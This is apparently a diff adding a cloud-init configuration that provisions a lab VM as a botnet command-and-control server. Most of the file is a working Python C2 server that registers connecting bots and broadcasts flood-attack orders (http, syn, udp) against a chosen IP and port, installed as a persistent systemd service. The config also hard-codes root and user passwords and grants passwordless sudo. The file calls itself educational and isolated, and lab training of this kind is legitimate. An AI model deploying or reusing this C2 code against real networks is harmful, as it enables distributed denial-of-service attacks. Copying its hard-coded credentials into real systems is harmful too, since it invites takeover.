@@ -1,0 +1,198 @@
+#cloud-config
+# VM: ATT-C2-Server (10.10.10.10) - Botnet command & control (isolated lab)
+hostname: att-c2
+manage_etc_hosts: true
+timezone: Asia/Ho_Chi_Minh
+
+users:
+  - name: attacker
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    shell: /bin/bash
+    lock_passwd: false
+    plain_text_passwd: "Attack@123"
+    ssh_authorized_keys:
+      - __SSH_PUBKEY__
+
+chpasswd:
+  list: |
+    root:Attack@123
+    attacker:Attack@123
+  expire: false
+
+ssh_pwauth: true
+
+write_files:
+  - path: /opt/botnet/c2_server.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      """ATT Lab - simulated botnet C2 server (educational, isolated network).
+
+      Bots connect on TCP/9999. A local-only control port TCP/9998 accepts:
+        attack <ip> <port> [duration] [http|syn|udp]
+        bots
+      """
+      import json
+      import socket
+      import sys
+      import threading
+      import time
+
+      BOTS = {}
+      BOTS_LOCK = threading.Lock()
+      C2_PORT = 9999
+      CONTROL_PORT = 9998
+
+
+      def log(msg):
+          print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)
+
+
+      def handle_bot(conn, addr):
+          bot_id = addr[0]
+          with BOTS_LOCK:
+              BOTS[bot_id] = conn
+              total = len(BOTS)
+          log(f"BOT ONLINE {bot_id} (total={total})")
+          try:
+              while True:
+                  data = conn.recv(4096)
+                  if not data:
+                      break
+                  log(f"[{bot_id}] {data.decode(errors='replace').strip()}")
+          except OSError:
+              pass
+          finally:
+              with BOTS_LOCK:
+                  BOTS.pop(bot_id, None)
+                  total = len(BOTS)
+              try:
+                  conn.close()
+              except OSError:
+                  pass
+              log(f"BOT OFFLINE {bot_id} (total={total})")
+
+
+      def send_attack(target_ip, target_port, duration, attack_type):
+          cmd = json.dumps({
+              "cmd": "attack",
+              "target_ip": target_ip,
+              "target_port": target_port,
+              "duration": duration,
+              "type": attack_type,
+          }) + "\n"
+          with BOTS_LOCK:
+              items = list(BOTS.items())
+          sent = 0
+          for bot_id, conn in items:
+              try:
+                  conn.sendall(cmd.encode())
+                  sent += 1
+              except OSError:
+                  with BOTS_LOCK:
+                      BOTS.pop(bot_id, None)
+          log(f"ATTACK {target_ip}:{target_port} type={attack_type} "
+              f"duration={duration}s -> {sent} bot(s)")
+          return sent
+
+
+      def control_loop():
+          srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          srv.bind(("127.0.0.1", CONTROL_PORT))
+          srv.listen(5)
+          log(f"control listening on 127.0.0.1:{CONTROL_PORT}")
+          while True:
+              try:
+                  conn, _ = srv.accept()
+                  with conn:
+                      line = conn.recv(1024).decode(errors="replace").strip()
+                      parts = line.split()
+                      if parts and parts[0] == "attack" and len(parts) >= 3:
+                          sent = send_attack(
+                              parts[1],
+                              int(parts[2]),
+                              int(parts[3]) if len(parts) > 3 else 30,
+                              parts[4] if len(parts) > 4 else "http",
+                          )
+                          conn.sendall(f"OK bots={sent}\n".encode())
+                      elif parts and parts[0] == "bots":
+                          with BOTS_LOCK:
+                              ids = list(BOTS)
+                          conn.sendall((json.dumps(ids) + "\n").encode())
+                      else:
+                          conn.sendall(
+                              b"ERR usage: attack <ip> <port> [duration] [type]\n")
+              except Exception as exc:
+                  log(f"control error: {exc}")
+
+
+      def cli_loop():
+          try:
+              while True:
+                  cmd = input("C2> ").strip().split()
+                  if not cmd:
+                      continue
+                  if cmd[0] == "bots":
+                      with BOTS_LOCK:
+                          print(f"Online bots ({len(BOTS)}): {list(BOTS)}")
+                  elif cmd[0] == "attack" and len(cmd) >= 3:
+                      send_attack(cmd[1], int(cmd[2]),
+                                  int(cmd[3]) if len(cmd) > 3 else 30,
+                                  cmd[4] if len(cmd) > 4 else "http")
+                  elif cmd[0] == "quit":
+                      return
+          except (EOFError, KeyboardInterrupt):
+              return
+
+
+      def main():
+          server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          server.bind(("0.0.0.0", C2_PORT))
+          server.listen(50)
+          log(f"C2 listening on 0.0.0.0:{C2_PORT}")
+          threading.Thread(target=control_loop, daemon=True).start()
+          threading.Thread(target=cli_loop, daemon=True).start()
+          while True:
+              conn, addr = server.accept()
+              threading.Thread(target=handle_bot, args=(conn, addr),
+                               daemon=True).start()
+
+
+      if __name__ == "__main__":
+          try:
+              main()
+          except KeyboardInterrupt:
+              sys.exit(0)
+
+  - path: /etc/systemd/system/att-c2.service
+    permissions: '0644'
+    content: |
+      [Unit]
+      Description=ATT Lab C2 Server (simulated)
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      ExecStart=/usr/bin/python3 /opt/botnet/c2_server.py
+      Restart=always
+      RestartSec=3
+      StandardOutput=journal
+      StandardError=journal
+
+      [Install]
+      WantedBy=multi-user.target
+
+runcmd:
+  - |
+    set -u
+    for i in 1 2 3 4 5; do apt-get update -y -q && break; sleep 5; done
+    DEBIAN_FRONTEND=noninteractive apt-get install -y -q \
+      python3 python3-requests netcat-openbsd hping3 curl net-tools tcpdump
+    chmod +x /opt/botnet/c2_server.py
+    systemctl daemon-reload
+    systemctl enable --now att-c2
+    sleep 2
+    systemctl is-active att-c2 || true
+    echo "STATUS: READY $(date -Is) role=c2" > /var/log/att-setup.log
